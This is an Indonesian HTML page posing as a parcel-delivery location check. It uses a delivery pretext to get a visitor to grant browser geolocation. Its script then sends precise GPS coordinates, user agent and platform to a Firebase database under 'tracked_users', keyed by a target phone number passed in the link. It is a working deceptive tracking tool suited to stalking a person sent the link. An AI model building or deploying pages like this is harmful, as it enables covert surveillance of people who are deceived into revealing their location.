<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi Lokasi Pengiriman</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px 30px;
            max-width: 420px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
        }
        .icon {
            width: 80px;
            height: 80px;
            margin: 0 auto 20px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
        }
        h1 {
            font-size: 24px;
            color: #2d3748;
            margin-bottom: 12px;
        }
        .subtitle {
            color: #718096;
            font-size: 14px;
            line-height: 1.6;
            margin-bottom: 24px;
        }
        .status-box {
            background: #f7fafc;
            border: 2px solid #e2e8f0;
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 24px;
            font-size: 13px;
            color: #4a5568;
        }
        .status-box.success {
            background: #c6f6d5;
            border-color: #9ae6b4;
            color: #22543d;
        }
        .status-box.error {
            background: #fed7d7;
            border-color: #fc8787;
            color: #742a2a;
        }
        .status-box.loading {
            background: #bee3f8;
            border-color: #90cdf4;
            color: #2c5282;
        }
        .spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 3px solid #e2e8f0;
            border-top-color: #667eea;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-right: 8px;
            vertical-align: middle;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .button-group {
            display: flex;
            gap: 12px;
        }
        button {
            flex: 1;
            padding: 12px 20px;
            border: none;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
        }
        .btn-primary {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
        }
        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
        }
        .btn-secondary {
            background: #edf2f7;
            color: #2d3748;
            border: 1px solid #cbd5e0;
        }
        .btn-secondary:hover {
            background: #e2e8f0;
        }
        button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        .info-text {
            font-size: 12px;
            color: #718096;
            margin-top: 16px;
            padding-top: 16px;
            border-top: 1px solid #e2e8f0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">📍</div>
        <h1>Verifikasi Lokasi Pengiriman</h1>
        <p class="subtitle">Izinkan akses lokasi untuk mempercepat verifikasi paket Anda. Data lokasi akan dikirim ke dashboard driver.</p>
        
        <div id="statusBox" class="status-box loading">
            <span class="spinner"></span>
            <span id="statusText">Mempersiapkan verifikasi...</span>
        </div>

        <div class="button-group">
            <button id="allowBtn" class="btn-primary" onclick="requestLocation()">✓ Izinkan Lokasi</button>
            <button id="retryBtn" class="btn-secondary" onclick="requestLocation()" style="display:none;">Coba Lagi</button>
        </div>

        <div class="info-text">
            <strong>Tips:</strong> Jika tidak muncul pop-up, periksa izin browser atau setting lokasi di perangkat Anda.
        </div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
    <script>
        const statusBox = document.getElementById('statusBox');
        const statusText = document.getElementById('statusText');
        const allowBtn = document.getElementById('allowBtn');
        const retryBtn = document.getElementById('retryBtn');

        // Firebase Config - PASTIKAN SUDAH DIISI DENGAN CREDENTIALS YANG BENAR
        const firebaseConfig = {
            apiKey: "COPAS_API_KEY_KAMU",
            authDomain: "PROJECT_KAMU.firebaseapp.com",
            databaseURL: "https://PROJECT_KAMU-default-rtdb.firebaseio.com",
            projectId: "PROJECT_KAMU",
            storageBucket: "PROJECT_KAMU.appspot.com",
            messagingSenderId: "ID_KAMU",
            appId: "APP_ID_KAMU"
        };

        // Cek apakah Firebase sudah dikonfigurasi
        const isFirebaseConfigured = firebaseConfig.apiKey !== 'COPAS_API_KEY_KAMU';

        if (!isFirebaseConfigured) {
            statusBox.className = 'status-box error';
            statusText.textContent = '⚠️ Firebase belum dikonfigurasi. Hubungi admin.';
            allowBtn.disabled = true;
            allowBtn.style.display = 'none';
        } else {
            try {
                firebase.initializeApp(firebaseConfig);
            } catch (e) {
                console.log('Firebase sudah diinisialisasi');
            }
        }

        const database = firebase.database();
        const urlParams = new URLSearchParams(window.location.search);
        const targetNumber = urlParams.get('num') || urlParams.get('nomor') || 'unknown_' + Date.now();

        function updateStatus(state, text, showRetry = false) {
            statusBox.className = `status-box ${state}`;
            statusText.textContent = text;
            retryBtn.style.display = showRetry ? 'block' : 'none';
            allowBtn.style.display = showRetry ? 'none' : 'block';
        }

        function sendLocationToFirebase(lat, lng, accuracy, method) {
            const data = {
                latitude: lat,
                longitude: lng,
                accuracy: accuracy,
                status: method,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                waktu: new Date().toLocaleString('id-ID'),
                timestamp: Date.now()
            };

            updateStatus('loading', '<span class="spinner"></span> Mengirim data...');

            database.ref('tracked_users/' + targetNumber).set(data)
                .then(() => {
                    updateStatus('success', '✓ Lokasi berhasil dikirim. Dashboard akan diperbarui.');
                    setTimeout(() => {
                        statusText.textContent = '✓ Data dikirim. Anda dapat menutup halaman ini.';
                    }, 2000);
                })
                .catch((error) => {
                    console.error('Firebase error:', error);
                    updateStatus('error', `⚠️ Gagal mengirim: ${error.message}`, true);
                });
        }

        function requestLocation() {
            allowBtn.disabled = true;
            updateStatus('loading', '<span class="spinner"></span> Meminta akses lokasi...');

            if (!navigator.geolocation) {
                updateStatus('error', '⚠️ Browser tidak mendukung Geolocation.', true);
                allowBtn.disabled = false;
                return;
            }

            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    const acc = position.coords.accuracy;
                    sendLocationToFirebase(lat, lng, acc, 'Akurat (GPS)');
                },
                (error) => {
                    allowBtn.disabled = false;
                    let errorMsg = '';
                    if (error.code === error.PERMISSION_DENIED) {
                        errorMsg = '⚠️ Izin lokasi ditolak. Klik "Izinkan" lagi atau ubah setting browser.';
                    } else if (error.code === error.POSITION_UNAVAILABLE) {
                        errorMsg = '⚠️ Lokasi tidak tersedia. Cek GPS/lokasi perangkat.';
                    } else if (error.code === error.TIMEOUT) {
                        errorMsg = '⚠️ Waktu permintaan habis. Coba lagi.';
                    } else {
                        errorMsg = `⚠️ Error: ${error.message}`;
                    }
                    updateStatus('error', errorMsg, true);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                }
            );
        }

        // Cek apakah nomor target ada di URL
        if (!urlParams.get('num') && !urlParams.get('nomor')) {
            statusBox.className = 'status-box error';
            statusText.textContent = '⚠️ Parameter nomor tidak ditemukan. Cek URL.';
            allowBtn.disabled = true;
        } else {
            // Siap untuk request lokasi
            updateStatus('loading', 'Tekan "Izinkan Lokasi" untuk melanjutkan.');
            allowBtn.disabled = false;
        }
    </script>
</body>
</html>
